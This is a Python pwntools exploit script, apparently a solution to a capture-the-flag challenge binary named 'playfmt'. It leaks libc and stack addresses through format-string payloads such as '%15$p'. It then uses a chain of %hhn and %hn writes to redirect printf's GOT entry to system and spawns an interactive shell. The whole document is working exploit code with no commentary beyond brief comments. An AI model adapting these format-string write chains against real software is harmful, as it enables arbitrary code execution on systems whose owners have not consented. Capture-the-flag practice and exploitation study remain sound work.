from pwn import *

p = process('./playfmt')
elf = ELF('./playfmt')
libc = elf.libc
printf = elf.got['printf']
printfGOT = '0x0804a010'

# leak libc base address
payload = '%15$p'
p.recv()
p.sendline(payload)
libc_start_main = int(p.recvline().strip(), 16) - 245
base = libc_start_main - libc.sym['__libc_start_main']
success('libc base = 0x%x', base)
system = base + libc.sym['system']
success('system = 0x%x', system)
sh = base + next(libc.search(b'/bin/sh\x00'))
# leak ebp
payload = '%10$p'
p.sendline(payload)
ebp = int(p.recv().strip(),16)
success('ebp = 0x%x', ebp)
# overwrite ebp to printf@got
payload = '%' + str(int(printfGOT[8:],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(hex(ebp+1)[8:],16)) + 'c%6$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(printfGOT[6:8],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(hex(ebp+2)[8:],16)) + 'c%6$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(printfGOT[4:6],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(hex(ebp+3)[8:],16)) + 'c%6$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(printfGOT[2:4],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)

# overwrite ebp-0x14 to printf@got+2
printfGOT = '0x0804a012'
payload = '%' + str(int(hex(ebp-0x14)[8:],16)) + 'c%6$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(printfGOT[8:],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(hex(ebp+1-0x14)[8:],16)) + 'c%6$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(printfGOT[6:8],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(hex(ebp+2-0x14)[8:],16)) + 'c%6$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(printfGOT[4:6],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(hex(ebp+3-0x14)[8:],16)) + 'c%6$hhn\x00'
p.sendline(payload)
sleep(0.05)
payload = '%' + str(int(printfGOT[2:4],16)) + 'c%10$hhn\x00'
p.sendline(payload)
sleep(0.05)

# write printf@got to system
payload = '%' + str(int(hex(system)[6:],16)) + 'c%14$hn' + '%' + str(int(hex(system)[2:6],16)-int(hex(system)[6:],16)) + 'c%9$hnEND\n\x00'
p.sendline(payload)
sleep(0.05)
p.sendlineafter('END\n','sh')
p.interactive()